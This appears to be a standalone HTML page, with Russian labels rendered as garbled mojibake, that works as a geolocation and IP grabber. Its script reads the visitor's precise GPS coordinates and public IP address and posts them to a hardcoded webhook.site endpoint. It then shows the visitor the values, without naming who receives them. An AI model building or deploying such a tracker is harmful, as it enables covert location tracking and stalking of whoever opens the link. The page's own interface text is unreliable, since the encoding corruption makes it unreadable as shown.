<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –∏ IP</title>
<style>
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: linear-gradient(120deg, #f0f4ff, #e0e7ff);
    height: 100vh;
    margin: 0;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    color: #333;
    text-align: center;
  }
  button {
    background-color: #007aff;
    color: white;
    border: none;
    border-radius: 12px;
    padding: 14px 28px;
    font-size: 18px;
    cursor: pointer;
    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
    transition: background-color 0.3s ease;
  }
  button:hover {
    background-color: #005edb;
  }
  #info {
    margin-top: 20px;
    font-size: 16px;
    max-width: 90vw;
  }
</style>
</head>
<body>
  <h1>üîç –ü–æ–ª—É—á–∏—Ç—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é –∏ IP</h1>
  <button id="btn">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∏ –ø–æ–∫–∞–∑–∞—Ç—å –¥–∞–Ω–Ω—ã–µ</button>
  <div id="info"></div>

<script>
const WEBHOOK_URL = 'https://webhook.site/3038f7cb-b8c9-463e-b74c-43cace83af30';

async function getIP() {
  try {
    let res = await fetch('https://api.ipify.org?format=json');
    let data = await res.json();
    return data.ip;
  } catch {
    return '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å IP';
  }
}

function sendData(lat, lon, ip) {
  fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({latitude: lat, longitude: lon, ip: ip})
  })
  .catch(e => alert('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö: ' + e));
}

document.getElementById('btn').onclick = async () => {
  if (!navigator.geolocation) {
    alert('–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –≤ –≤–∞—à–µ–º –±—Ä–∞—É–∑–µ—Ä–µ');
    return;
  }

  document.getElementById('info').textContent = '–ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ...';

  navigator.geolocation.getCurrentPosition(async (pos) => {
    const lat = pos.coords.latitude.toFixed(6);
    const lon = pos.coords.longitude.toFixed(6);
    const ip = await getIP();

    sendData(lat, lon, ip);

    document.getElementById('info').innerHTML = `
      <b>–í–∞—à–∏ –¥–∞–Ω–Ω—ã–µ:</b><br>
      –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: ${lat}, ${lon}<br>
      IP: ${ip}
    `;
  }, err => {
    alert('–û—à–∏–±–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏: ' + err.message);
    document.getElementById('info').textContent = '';
  });
};
</script>
</body>
</html>
